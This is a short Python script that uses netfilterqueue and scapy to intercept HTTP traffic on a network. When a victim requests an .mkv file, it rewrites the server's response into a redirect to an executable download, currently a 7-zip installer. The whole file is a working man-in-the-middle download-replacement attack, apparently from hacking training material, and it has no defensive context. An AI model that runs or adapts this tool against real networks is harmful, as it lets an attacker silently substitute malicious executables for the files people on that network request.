#! /usr/bin/env/ python

import netfilterqueue as nfq
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet.haslayer(scapy.TCP):
			if scapy_packet[scapy.TCP].dport == 80:
				print("HTTP Request")
				if ".mkv" in scapy_packet[scapy.Raw].load:
					print("[+] Mkv Requested.")
					ack_list.append(scapy_packet[scapy.TCP].ack)
				
			elif scapy_packet[scapy.TCP].sport == 80:
				if scapy_packet[scapy.TCP].seq in ack_list:
					ack_list.remove(scapy_packet[scapy.TCP].seq)
					print("[+] Replacing file")
					modified_packet=set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z2201-x64.exe\n\n")
					
					packet.set_payload(str(modified_packet))
	packet.accept()
	
queue = nfq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
